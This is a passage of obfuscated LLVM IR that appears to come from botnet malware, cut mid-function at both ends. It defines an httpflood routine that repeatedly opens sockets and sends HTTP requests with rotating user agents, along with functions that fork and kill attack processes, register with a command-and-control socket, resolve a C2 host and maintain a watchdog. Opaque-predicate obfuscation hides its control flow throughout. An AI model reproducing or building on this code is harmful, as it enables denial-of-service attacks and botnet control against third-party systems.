  %56 = icmp eq i32 %55, -1
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  call void @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0))
  call void @exit(i32 1) #12
  unreachable

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* @x.27
  %60 = load i32, i32* @y.28
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %58
  %67 = load i32, i32* %8, align 4
  %68 = load i32, i32* @x.27
  %69 = load i32, i32* @y.28
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %67

originalBBalteredBB:                              ; preds = %originalBB, %13
  %76 = load %struct.hostent*, %struct.hostent** %5, align 8
  %77 = getelementptr inbounds %struct.hostent, %struct.hostent* %76, i32 0, i32 4
  %78 = load i8**, i8*** %77, align 8
  %79 = getelementptr inbounds i8*, i8** %78, i64 0
  %80 = load i8*, i8** %79, align 8
  %81 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %82 = bitcast %struct.in_addr* %81 to i8*
  %83 = load %struct.hostent*, %struct.hostent** %5, align 8
  %84 = getelementptr inbounds %struct.hostent, %struct.hostent* %83, i32 0, i32 3
  %85 = load i32, i32* %84, align 4
  %86 = sext i32 %85 to i64
  call void @bcopy(i8* %80, i8* %82, i64 %86) #6
  %87 = load i16, i16* %4, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %87) #9
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %88, i16* %89, align 2
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %90, align 4
  %91 = call i32 @socket(i32 2, i32 1, i32 6) #6
  store i32 %91, i32* %8, align 4
  %92 = load i32, i32* %8, align 4
  %93 = bitcast i32* %7 to i8*
  %94 = call i32 @setsockopt(i32 %92, i32 6, i32 1, i8* %93, i32 4) #6
  %95 = load i32, i32* %8, align 4
  %96 = icmp eq i32 %95, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %58
  %97 = load i32, i32* %8, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare void @herror(i8*) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #8

declare void @perror(i8*) #5

; Function Attrs: noinline nounwind uwtable
define void @httpflood(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = load i32, i32* @x.29
  %8 = load i32, i32* @y.30
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca [512 x i8], align 16
  %26 = alloca [1 x i8], align 1
  store i8* %0, i8** %15, align 8
  store i8* %1, i8** %16, align 8
  store i16 %2, i16* %17, align 2
  store i8* %3, i8** %18, align 8
  store i32 %4, i32* %19, align 4
  store i32 %5, i32* %20, align 4
  %27 = call i64 @time(i64* null) #6
  %28 = load i32, i32* %19, align 4
  %29 = sext i32 %28 to i64
  %30 = add nsw i64 %27, %29
  %31 = trunc i64 %30 to i32
  store i32 %31, i32* %23, align 4
  store i32 0, i32* %24, align 4
  store i32 0, i32* %22, align 4
  %32 = load i32, i32* @x.29
  %33 = load i32, i32* @y.30
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %40

; <label>:40:                                     ; preds = %111, %originalBBpart2
  %41 = load i32, i32* %22, align 4
  %42 = load i32, i32* %20, align 4
  %43 = icmp slt i32 %41, %42
  br i1 %43, label %44, label %114

; <label>:44:                                     ; preds = %40
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %46 = load i8*, i8** %15, align 8
  %47 = load i8*, i8** %18, align 8
  %48 = load i8*, i8** %16, align 8
  %49 = call i32 @rand() #6
  %50 = srem i32 %49, 39
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds [39 x i8*], [39 x i8*]* @UserAgents, i64 0, i64 %51
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 (i8*, i8*, ...) @sprintf(i8* %45, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.53, i32 0, i32 0), i8* %46, i8* %47, i8* %48, i8* %53) #6
  br label %55

; <label>:55:                                     ; preds = %109, %44
  %56 = load i32, i32* @x.29
  %57 = load i32, i32* @y.30
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBB4, label %originalBB4alteredBB

originalBB4:                                      ; preds = %originalBB4alteredBB, %55
  %64 = load i32, i32* %23, align 4
  %65 = sext i32 %64 to i64
  %66 = call i64 @time(i64* null) #6
  %67 = icmp sgt i64 %65, %66
  %68 = load i32, i32* @x.29
  %69 = load i32, i32* @y.30
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart26, label %originalBB4alteredBB

originalBBpart26:                                 ; preds = %originalBB4
  br i1 %67, label %76, label %110

; <label>:76:                                     ; preds = %originalBBpart26
  %77 = load i8*, i8** %16, align 8
  %78 = load i16, i16* %17, align 2
  %79 = call i32 @socket_connect(i8* %77, i16 zeroext %78)
  store i32 %79, i32* %21, align 4
  %80 = load i32, i32* %21, align 4
  %81 = icmp ne i32 %80, 0
  br i1 %81, label %82, label %109

; <label>:82:                                     ; preds = %76
  %83 = load i32, i32* @x.29
  %84 = load i32, i32* @y.30
  %85 = sub i32 %83, 1
  %86 = mul i32 %83, %85
  %87 = urem i32 %86, 2
  %88 = icmp eq i32 %87, 0
  %89 = icmp slt i32 %84, 10
  %90 = or i1 %88, %89
  br i1 %90, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %82
  %91 = load i32, i32* %21, align 4
  %92 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %93 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %94 = call i64 @strlen(i8* %93) #10
  %95 = call i64 @write(i32 %91, i8* %92, i64 %94)
  %96 = load i32, i32* %21, align 4
  %97 = getelementptr inbounds [1 x i8], [1 x i8]* %26, i32 0, i32 0
  %98 = call i64 @read(i32 %96, i8* %97, i64 1)
  %99 = load i32, i32* %21, align 4
  %100 = call i32 @close(i32 %99)
  %101 = load i32, i32* @x.29
  %102 = load i32, i32* @y.30
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart210, label %originalBB8alteredBB

originalBBpart210:                                ; preds = %originalBB8
  br label %109

; <label>:109:                                    ; preds = %originalBBpart210, %76
  br label %55

; <label>:110:                                    ; preds = %originalBBpart26
  call void @exit(i32 0) #12
  unreachable
                                                  ; No predecessors!
  %112 = load i32, i32* %22, align 4
  %113 = add nsw i32 %112, 1
  store i32 %113, i32* %22, align 4
  br label %40

; <label>:114:                                    ; preds = %40
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %115 = alloca i8*, align 8
  %116 = alloca i8*, align 8
  %117 = alloca i16, align 2
  %118 = alloca i8*, align 8
  %119 = alloca i32, align 4
  %120 = alloca i32, align 4
  %121 = alloca i32, align 4
  %122 = alloca i32, align 4
  %123 = alloca i32, align 4
  %124 = alloca i32, align 4
  %125 = alloca [512 x i8], align 16
  %126 = alloca [1 x i8], align 1
  store i8* %0, i8** %115, align 8
  store i8* %1, i8** %116, align 8
  store i16 %2, i16* %117, align 2
  store i8* %3, i8** %118, align 8
  store i32 %4, i32* %119, align 4
  store i32 %5, i32* %120, align 4
  %127 = call i64 @time(i64* null) #6
  %128 = load i32, i32* %119, align 4
  %129 = sext i32 %128 to i64
  %_ = shl i64 %127, %129
  %_1 = sub i64 %127, %129
  %gen = mul i64 %_1, %129
  %_2 = sub i64 0, %127
  %gen3 = add i64 %_2, %129
  %130 = add nsw i64 %127, %129
  %131 = trunc i64 %130 to i32
  store i32 %131, i32* %123, align 4
  store i32 0, i32* %124, align 4
  store i32 0, i32* %122, align 4
  br label %originalBB

originalBB4alteredBB:                             ; preds = %originalBB4, %55
  %132 = load i32, i32* %23, align 4
  %133 = sext i32 %132 to i64
  %134 = call i64 @time(i64* null) #6
  %135 = icmp sgt i64 %133, %134
  br label %originalBB4

originalBB8alteredBB:                             ; preds = %originalBB8, %82
  %136 = load i32, i32* %21, align 4
  %137 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %138 = getelementptr inbounds [512 x i8], [512 x i8]* %25, i32 0, i32 0
  %139 = call i64 @strlen(i8* %138) #10
  %140 = call i64 @write(i32 %136, i8* %137, i64 %139)
  %141 = load i32, i32* %21, align 4
  %142 = getelementptr inbounds [1 x i8], [1 x i8]* %26, i32 0, i32 0
  %143 = call i64 @read(i32 %141, i8* %142, i64 1)
  %144 = load i32, i32* %21, align 4
  %145 = call i32 @close(i32 %144)
  br label %originalBB8
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #2

declare i64 @write(i32, i8*, i64) #5

declare i64 @read(i32, i8*, i64) #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #6
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %26

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* @x.31
  %10 = load i32, i32* @y.32
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  %17 = load i32, i32* %2, align 4
  store i32 %17, i32* %1, align 4
  %18 = load i32, i32* @x.31
  %19 = load i32, i32* @y.32
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %79

; <label>:26:                                     ; preds = %0
  %27 = load i64, i64* @numattackpids, align 8
  %28 = add i64 %27, 1
  store i64 %28, i64* @numattackpids, align 8
  %29 = load i64, i64* @numattackpids, align 8
  %30 = add i64 %29, 1
  %31 = mul i64 %30, 4
  %32 = call noalias i8* @malloc(i64 %31) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %3, align 8
  store i32 0, i32* %4, align 4
  br label %34

; <label>:34:                                     ; preds = %66, %26
  %35 = load i32, i32* %4, align 4
  %36 = zext i32 %35 to i64
  %37 = load i64, i64* @numattackpids, align 8
  %38 = sub i64 %37, 1
  %39 = icmp ult i64 %36, %38
  br i1 %39, label %40, label %69

; <label>:40:                                     ; preds = %34
  %41 = load i32, i32* @x.31
  %42 = load i32, i32* @y.32
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %40
  %49 = load i32*, i32** @attackpids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = zext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  %53 = load i32, i32* %52, align 4
  %54 = load i32*, i32** %3, align 8
  %55 = load i32, i32* %4, align 4
  %56 = zext i32 %55 to i64
  %57 = getelementptr inbounds i32, i32* %54, i64 %56
  store i32 %53, i32* %57, align 4
  %58 = load i32, i32* @x.31
  %59 = load i32, i32* @y.32
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %66

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = load i32, i32* %4, align 4
  %68 = add i32 %67, 1
  store i32 %68, i32* %4, align 4
  br label %34

; <label>:69:                                     ; preds = %34
  %70 = load i32, i32* %2, align 4
  %71 = load i32*, i32** %3, align 8
  %72 = load i64, i64* @numattackpids, align 8
  %73 = sub i64 %72, 1
  %74 = getelementptr inbounds i32, i32* %71, i64 %73
  store i32 %70, i32* %74, align 4
  %75 = load i32*, i32** @attackpids, align 8
  %76 = bitcast i32* %75 to i8*
  call void @free(i8* %76) #6
  %77 = load i32*, i32** %3, align 8
  store i32* %77, i32** @attackpids, align 8
  %78 = load i32, i32* %2, align 4
  store i32 %78, i32* %1, align 4
  br label %79

; <label>:79:                                     ; preds = %69, %originalBBpart2
  %80 = load i32, i32* %1, align 4
  ret i32 %80

originalBBalteredBB:                              ; preds = %originalBB, %8
  %81 = load i32, i32* %2, align 4
  store i32 %81, i32* %1, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %40
  %82 = load i32*, i32** @attackpids, align 8
  %83 = load i32, i32* %4, align 4
  %84 = zext i32 %83 to i64
  %85 = getelementptr inbounds i32, i32* %82, i64 %84
  %86 = load i32, i32* %85, align 4
  %87 = load i32*, i32** %3, align 8
  %88 = load i32, i32* %4, align 4
  %89 = zext i32 %88 to i64
  %90 = getelementptr inbounds i32, i32* %87, i64 %89
  store i32 %86, i32* %90, align 4
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: noinline nounwind uwtable
define void @stop_attack() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  store i64 0, i64* %2, align 8
  br label %3

; <label>:3:                                      ; preds = %45, %0
  %4 = load i64, i64* %2, align 8
  %5 = load i64, i64* @numattackpids, align 8
  %6 = icmp ult i64 %4, %5
  br i1 %6, label %7, label %48

; <label>:7:                                      ; preds = %3
  %8 = load i32*, i32** @attackpids, align 8
  %9 = load i64, i64* %2, align 8
  %10 = getelementptr inbounds i32, i32* %8, i64 %9
  %11 = load i32, i32* %10, align 4
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %13, label %28

; <label>:13:                                     ; preds = %7
  %14 = load i32*, i32** @attackpids, align 8
  %15 = load i64, i64* %2, align 8
  %16 = getelementptr inbounds i32, i32* %14, i64 %15
  %17 = load i32, i32* %16, align 4
  %18 = call i32 @getpid() #6
  %19 = icmp ne i32 %17, %18
  br i1 %19, label %20, label %28

; <label>:20:                                     ; preds = %13
  %21 = load i32*, i32** @attackpids, align 8
  %22 = load i64, i64* %2, align 8
  %23 = getelementptr inbounds i32, i32* %21, i64 %22
  %24 = load i32, i32* %23, align 4
  %25 = call i32 @kill(i32 %24, i32 9) #6
  %26 = load i32, i32* %1, align 4
  %27 = add nsw i32 %26, 1
  store i32 %27, i32* %1, align 4
  br label %28

; <label>:28:                                     ; preds = %20, %13, %7
  %29 = load i32, i32* @x.33
  %30 = load i32, i32* @y.34
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %28
  %37 = load i32, i32* @x.33
  %38 = load i32, i32* @y.34
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %45

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i64, i64* %2, align 8
  %47 = add i64 %46, 1
  store i64 %47, i64* %2, align 8
  br label %3

; <label>:48:                                     ; preds = %3
  %49 = load i32, i32* @x.33
  %50 = load i32, i32* @y.34
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %48
  %57 = load i32, i32* @x.33
  %58 = load i32, i32* @y.34
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %28
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %48
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @getpid() #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: noinline nounwind uwtable
define void @registerme(i8*) #0 {
  %2 = load i32, i32* @x.35
  %3 = load i32, i32* @y.36
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i8*, align 8
  %11 = alloca [100 x i8], align 16
  store i8* %0, i8** %10, align 8
  %12 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i32 0, i32 0
  %13 = load i8*, i8** %10, align 8
  %14 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %12, i64 100, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.55, i32 0, i32 0), i8* %13) #6
  %15 = load i32, i32* @C2, align 4
  %16 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i32 0, i32 0
  %17 = getelementptr inbounds [100 x i8], [100 x i8]* %11, i32 0, i32 0
  %18 = call i64 @strlen(i8* %17) #10
  %19 = call i64 @write(i32 %15, i8* %16, i64 %18)
  %20 = icmp ne i64 %19, 0
  %21 = load i32, i32* @x.35
  %22 = load i32, i32* @y.36
  %23 = sub i32 %21, 1
  %24 = mul i32 %21, %23
  %25 = urem i32 %24, 2
  %26 = icmp eq i32 %25, 0
  %27 = icmp slt i32 %22, 10
  %28 = or i1 %26, %27
  br i1 %28, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %20, label %29, label %30

; <label>:29:                                     ; preds = %originalBBpart2
  br label %31

; <label>:30:                                     ; preds = %originalBBpart2
  br label %31

; <label>:31:                                     ; preds = %30, %29
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %32 = alloca i8*, align 8
  %33 = alloca [100 x i8], align 16
  store i8* %0, i8** %32, align 8
  %34 = getelementptr inbounds [100 x i8], [100 x i8]* %33, i32 0, i32 0
  %35 = load i8*, i8** %32, align 8
  %36 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* %34, i64 100, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.55, i32 0, i32 0), i8* %35) #6
  %37 = load i32, i32* @C2, align 4
  %38 = getelementptr inbounds [100 x i8], [100 x i8]* %33, i32 0, i32 0
  %39 = getelementptr inbounds [100 x i8], [100 x i8]* %33, i32 0, i32 0
  %40 = call i64 @strlen(i8* %39) #10
  %41 = call i64 @write(i32 %37, i8* %38, i64 %40)
  %42 = icmp ne i64 %41, 0
  br label %originalBB
}

; Function Attrs: nounwind
declare i32 @snprintf(i8*, i64, i8*, ...) #2

; Function Attrs: noinline nounwind uwtable
define i32 @resolve_http() #0 {
  %1 = load i32, i32* @x.37
  %2 = load i32, i32* @y.38
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca %struct.hostent*, align 8
  %11 = alloca %struct.in_addr**, align 8
  %12 = alloca i32, align 4
  %13 = load i8*, i8** @c2_http_host, align 8
  %14 = call %struct.hostent* @gethostbyname(i8* %13)
  store %struct.hostent* %14, %struct.hostent** %10, align 8
  %15 = icmp eq %struct.hostent* %14, null
  %16 = load i32, i32* @x.37
  %17 = load i32, i32* @y.38
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %15, label %24, label %25

; <label>:24:                                     ; preds = %originalBBpart2
  call void @herror(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.50, i32 0, i32 0)) #6
  store i32 1, i32* %9, align 4
  br label %99

; <label>:25:                                     ; preds = %originalBBpart2
  %26 = load i32, i32* @x.37
  %27 = load i32, i32* @y.38
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = load %struct.hostent*, %struct.hostent** %10, align 8
  %35 = getelementptr inbounds %struct.hostent, %struct.hostent* %34, i32 0, i32 4
  %36 = load i8**, i8*** %35, align 8
  %37 = bitcast i8** %36 to %struct.in_addr**
  store %struct.in_addr** %37, %struct.in_addr*** %11, align 8
  store i32 0, i32* %12, align 4
  %38 = load i32, i32* @x.37
  %39 = load i32, i32* @y.38
  %40 = sub i32 %38, 1
  %41 = mul i32 %38, %40
  %42 = urem i32 %41, 2
  %43 = icmp eq i32 %42, 0
  %44 = icmp slt i32 %39, 10
  %45 = or i1 %43, %44
  br i1 %45, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %46

; <label>:46:                                     ; preds = %95, %originalBBpart24
  %47 = load i32, i32* @x.37
  %48 = load i32, i32* @y.38
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %46
  %55 = load %struct.in_addr**, %struct.in_addr*** %11, align 8
  %56 = load i32, i32* %12, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %55, i64 %57
  %59 = load %struct.in_addr*, %struct.in_addr** %58, align 8
  %60 = icmp ne %struct.in_addr* %59, null
  %61 = load i32, i32* @x.37
  %62 = load i32, i32* @y.38
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %60, label %69, label %98

; <label>:69:                                     ; preds = %originalBBpart28
  %70 = load i32, i32* @x.37
  %71 = load i32, i32* @y.38
  %72 = sub i32 %70, 1
  %73 = mul i32 %70, %72
  %74 = urem i32 %73, 2
  %75 = icmp eq i32 %74, 0
  %76 = icmp slt i32 %71, 10
  %77 = or i1 %75, %76
  br i1 %77, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %69
  %78 = load %struct.in_addr**, %struct.in_addr*** %11, align 8
  %79 = load i32, i32* %12, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %78, i64 %80
  %82 = load %struct.in_addr*, %struct.in_addr** %81, align 8
  %83 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %82, i32 0, i32 0
  %84 = load i32, i32* %83, align 4
  %85 = call i8* @inet_ntoa(i32 %84) #6
  %86 = call i8* @strcpy(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i32 0, i32 0), i8* %85) #6
  store i32 0, i32* %9, align 4
  %87 = load i32, i32* @x.37
  %88 = load i32, i32* @y.38
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
  %93 = icmp slt i32 %88, 10
  %94 = or i1 %92, %93
  br i1 %94, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %99
                                                  ; No predecessors!
  %96 = load i32, i32* %12, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %12, align 4
  br label %46

; <label>:98:                                     ; preds = %originalBBpart28
  store i32 1, i32* %9, align 4
  br label %99

; <label>:99:                                     ; preds = %98, %originalBBpart212, %24
  %100 = load i32, i32* %9, align 4
  ret i32 %100

originalBBalteredBB:                              ; preds = %originalBB, %0
  %101 = alloca i32, align 4
  %102 = alloca %struct.hostent*, align 8
  %103 = alloca %struct.in_addr**, align 8
  %104 = alloca i32, align 4
  %105 = load i8*, i8** @c2_http_host, align 8
  %106 = call %struct.hostent* @gethostbyname(i8* %105)
  store %struct.hostent* %106, %struct.hostent** %102, align 8
  %107 = icmp eq %struct.hostent* %106, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %108 = load %struct.hostent*, %struct.hostent** %10, align 8
  %109 = getelementptr inbounds %struct.hostent, %struct.hostent* %108, i32 0, i32 4
  %110 = load i8**, i8*** %109, align 8
  %111 = bitcast i8** %110 to %struct.in_addr**
  store %struct.in_addr** %111, %struct.in_addr*** %11, align 8
  store i32 0, i32* %12, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %46
  %112 = load %struct.in_addr**, %struct.in_addr*** %11, align 8
  %113 = load i32, i32* %12, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %112, i64 %114
  %116 = load %struct.in_addr*, %struct.in_addr** %115, align 8
  %117 = icmp ne %struct.in_addr* %116, null
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %69
  %118 = load %struct.in_addr**, %struct.in_addr*** %11, align 8
  %119 = load i32, i32* %12, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds %struct.in_addr*, %struct.in_addr** %118, i64 %120
  %122 = load %struct.in_addr*, %struct.in_addr** %121, align 8
  %123 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %122, i32 0, i32 0
  %124 = load i32, i32* %123, align 4
  %125 = call i8* @inet_ntoa(i32 %124) #6
  %126 = call i8* @strcpy(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @c2_host, i32 0, i32 0), i8* %125) #6
  store i32 0, i32* %9, align 4
  br label %originalBB10
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @watchdog_maintain() #0 {
  %1 = load i32, i32* @x.39
  %2 = load i32, i32* @y.40
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca [7 x i32], align 16
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = bitcast [7 x i32]* %9 to i8*
